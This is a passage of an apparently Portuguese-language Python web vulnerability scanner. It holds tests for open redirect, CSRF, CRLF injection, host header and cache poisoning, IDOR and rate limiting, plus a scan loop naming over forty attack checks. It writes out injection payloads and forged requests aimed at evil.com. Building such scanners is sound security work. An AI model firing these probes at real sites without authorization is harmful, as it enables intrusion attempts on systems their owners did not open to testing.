            'https:evil.com', '/\\evil.com', '////evil.com',
            'https://evil.com%2f%2f', 'https://evil.com%00',
        ]
        params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'goto', 'dest', 'destination', 'redir', 'out']
        
        for param in params:
            for p in payloads:
                url = f"{target}{'&' if '?' in target else '?'}{param}={urllib.parse.quote(p)}"
                r = await self.make_request(url, allow_redirects=False)
                location = r["headers"].get('location', r["headers"].get('Location', ''))
                if 'evil.com' in location:
                    results.append(self.vuln(scan_id, "medium", "Open Redirect",
                        f"Redirect aberto via '{param}'", "Redirect", url, p,
                        f"Location: {location}", "Valide URLs de redirecionamento", "CWE-601"))
                    return results
        return results

    async def test_csrf(self, target: str, scan_id: str) -> List[Dict]:
        """CSRF Protection"""
        results = []
        paths = ['/api/update', '/api/delete', '/profile', '/settings', '/account', '/user/update']
        
        for path in paths:
            url = target.rstrip('/') + path
            r = await self.make_request(url, 'POST', 
                {'Content-Type': 'application/json', 'Origin': 'https://evil.com'},
                '{"test":"data"}')
            if r["status_code"] in [200, 201] and 'csrf' not in r["body"].lower():
                results.append(self.vuln(scan_id, "medium", "CSRF Possível",
                    f"Endpoint {path} sem proteção CSRF evidente", "CSRF", url, "POST from evil.com",
                    f"Status: {r['status_code']}", "Implemente tokens CSRF", "CWE-352"))
                break
        return results

    async def test_crlf_injection(self, target: str, scan_id: str) -> List[Dict]:
        """CRLF Injection"""
        results = []
        payloads = [
            '%0d%0aSet-Cookie:crlf=injection',
            '%0d%0aX-Injected:header',
            '%0aSet-Cookie:crlf=injection',
            '\\r\\nSet-Cookie:crlf=injection',
        ]
        for p in payloads:
            url = f"{target}{'&' if '?' in target else '?'}r={p}"
            r = await self.make_request(url)
            headers_str = str(r["headers"]).lower()
            if 'crlf=injection' in headers_str or 'x-injected' in headers_str:
                results.append(self.vuln(scan_id, "high", "CRLF Injection",
                    "Injeção de headers via CRLF", "Injection", url, p,
                    "Header injetado", "Sanitize \\r\\n do input", "CWE-113"))
                break
        return results

    # ==================== MISC (66-72) ====================

    async def test_clickjacking(self, target: str, scan_id: str) -> List[Dict]:
        """Clickjacking"""
        results = []
        r = await self.make_request(target)
        h = {k.lower(): v for k, v in r["headers"].items()}
        
        has_protection = False
        if 'x-frame-options' in h:
            has_protection = True
        if 'content-security-policy' in h and 'frame-ancestors' in h['content-security-policy'].lower():
            has_protection = True
        
        if not has_protection:
            results.append(self.vuln(scan_id, "medium", "Vulnerável a Clickjacking",
                "Sem proteção X-Frame-Options ou CSP frame-ancestors", "Configuration", target,
                "Frame analysis", "Pode ser embutido em iframe malicioso",
                "Adicione X-Frame-Options: DENY", "CWE-1021"))
        return results

    async def test_host_header_injection(self, target: str, scan_id: str) -> List[Dict]:
        """Host Header Injection"""
        results = []
        r = await self.make_request(target, headers={'Host': 'evil.com', 'X-Forwarded-Host': 'evil.com'})
        if 'evil.com' in r["body"].lower():
            results.append(self.vuln(scan_id, "high", "Host Header Injection",
                "Host header refletido na resposta", "Injection", target, "Host: evil.com",
                "Host malicioso processado", "Valide Host header", "CWE-644"))
        return results

    async def test_cache_poisoning(self, target: str, scan_id: str) -> List[Dict]:
        """Web Cache Poisoning indicators"""
        results = []
        r = await self.make_request(target, headers={
            'X-Forwarded-Host': 'evil.com',
            'X-Forwarded-Scheme': 'nothttps',
            'X-Original-URL': '/admin',
        })
        
        if any(i in r["body"].lower() for i in ['evil.com', 'nothttps', '/admin']):
            results.append(self.vuln(scan_id, "medium", "Possível Cache Poisoning",
                "Headers X-Forwarded refletidos", "Configuration", target,
                "X-Forwarded-Host: evil.com", "Headers manipuláveis",
                "Configure cache corretamente", "CWE-444"))
        return results

    async def test_error_messages(self, target: str, scan_id: str) -> List[Dict]:
        """Verbose Error Messages"""
        results = []
        error_triggers = [
            f"{target}/'", f"{target}/%00", f"{target}/{{{{", 
            f"{target}?id='", f"{target}?id[]=1",
        ]
        
        for url in error_triggers:
            r = await self.make_request(url)
            body = r["body"].lower()
            if any(i in body for i in ['traceback', 'stack trace', 'exception', 'error in', 
                                       'syntax error', 'fatal error', 'warning:', 'notice:',
                                       'at line', 'on line', 'debug', 'internal server error']):
                results.append(self.vuln(scan_id, "low", "Mensagens de Erro Verbosas",
                    "Erros detalhados expostos", "Info Disclosure", url, "Error trigger",
                    r["body"][:200], "Configure error handling seguro", "CWE-209"))
                break
        return results

    async def test_idor(self, target: str, scan_id: str) -> List[Dict]:
        """Insecure Direct Object Reference"""
        results = []
        endpoints = [
            ('/api/users/1', '/api/users/2'),
            ('/api/user?id=1', '/api/user?id=2'),
            ('/profile/1', '/profile/2'),
            ('/order/1', '/order/2'),
            ('/document/1', '/document/2'),
        ]
        
        for ep1, ep2 in endpoints:
            url1 = target.rstrip('/') + ep1
            url2 = target.rstrip('/') + ep2
            r1 = await self.make_request(url1)
            r2 = await self.make_request(url2)
            
            if r1["status_code"] == 200 and r2["status_code"] == 200:
                if r1["body"] != r2["body"] and len(r1["body"]) > 50:
                    results.append(self.vuln(scan_id, "high", "IDOR Detectado",
                        f"Acesso a recursos de outros usuários", "Authorization", url1,
                        f"{ep1} vs {ep2}", "Dados diferentes retornados",
                        "Implemente controle de acesso", "CWE-639"))
                    return results
        return results

    async def test_rate_limiting(self, target: str, scan_id: str) -> List[Dict]:
        """Rate Limiting"""
        results = []
        for _ in range(10):
            r = await self.make_request(target)
            if r["status_code"] == 429:
                return results
        
        results.append(self.vuln(scan_id, "low", "Rate Limiting Ausente",
            "Sem limite de requisições detectado", "Configuration", target,
            "10 requests", "Todas as requisições aceitas",
            "Implemente rate limiting", "CWE-770"))
        return results

    # ==================== MAIN SCAN ====================

    async def scan_target(self, scan_id: str, target: str, scan_type: str, status_callback=None) -> List[Dict]:
        """Executa scan completo com 70+ testes"""
        all_vulnerabilities = []
        
        tests = [
            # SQL Injection (1-4)
            ("SQL Error-Based", self.test_sql_error_based),
            ("SQL Union-Based", self.test_sql_union_based),
            ("SQL Blind Boolean", self.test_sql_blind_boolean),
            ("SQL Time-Based", self.test_sql_time_based),
            # XSS (5-7)
            ("XSS Reflected", self.test_xss_reflected),
            ("XSS DOM-Based", self.test_xss_dom),
            ("XSS Filter Bypass", self.test_xss_filter_bypass),
            # Injections (8-14)
            ("Command Injection", self.test_command_injection),
            ("XXE Injection", self.test_xxe_injection),
            ("SSTI", self.test_ssti),
            ("LDAP Injection", self.test_ldap_injection),
            ("XPath Injection", self.test_xpath_injection),
            ("NoSQL Injection", self.test_nosql_injection),
            ("GraphQL Injection", self.test_graphql_injection),
            # File/Path (15-18)
            ("LFI", self.test_lfi),
            ("RFI", self.test_rfi),
            ("Path Traversal", self.test_path_traversal),
            ("File Upload", self.test_file_upload),
            # SSRF (19)
            ("SSRF", self.test_ssrf),
            # Auth (20-25)
            ("Auth Bypass", self.test_auth_bypass),
            ("Default Credentials", self.test_default_credentials),
            ("JWT Vulnerabilities", self.test_jwt_vulnerabilities),
            ("Session Fixation", self.test_session_fixation),
            ("Brute Force", self.test_brute_force),
            # Headers/Config (26-31)
            ("Security Headers", self.test_security_headers),
            ("CORS", self.test_cors),
            ("SSL/TLS", self.test_ssl_tls),
            ("Cookie Security", self.test_cookie_security),
            ("HTTP Methods", self.test_http_methods),
            ("Server Info", self.test_server_info),
            # Files (32-34)
            ("Sensitive Files", self.test_sensitive_files),
            ("Backup Files", self.test_backup_files),
            ("Directory Listing", self.test_directory_listing),
            # Redirects/CSRF (35-37)
            ("Open Redirect", self.test_open_redirect),
            ("CSRF", self.test_csrf),
            ("CRLF Injection", self.test_crlf_injection),
            # Misc (38-43)
            ("Clickjacking", self.test_clickjacking),
            ("Host Header Injection", self.test_host_header_injection),
            ("Cache Poisoning", self.test_cache_poisoning),
            ("Error Messages", self.test_error_messages),
            ("IDOR", self.test_idor),
            ("Rate Limiting", self.test_rate_limiting),
        ]
        
        async with self:
            total = len(tests)
            for idx, (name, func) in enumerate(tests):
                try:
                    if status_callback:
                        await status_callback({
                            "progress": int((idx / total) * 100),
                            "currentTask": f"Testando: {name} ({idx+1}/{total})"
                        })
                    
                    vulns = await func(target, scan_id)
                    if vulns:
                        all_vulnerabilities.extend(vulns)
                    
                    await asyncio.sleep(0.3)
                    
                except Exception as e:
                    logger.error(f"Test {name} failed: {e}")
                    continue
            
            if status_callback:
                await status_callback({
                    "progress": 100,
                    "currentTask": f"Scan completado - {len(all_vulnerabilities)} vulnerabilidades",
                    "status": "completed"
                })
        
        return all_vulnerabilities
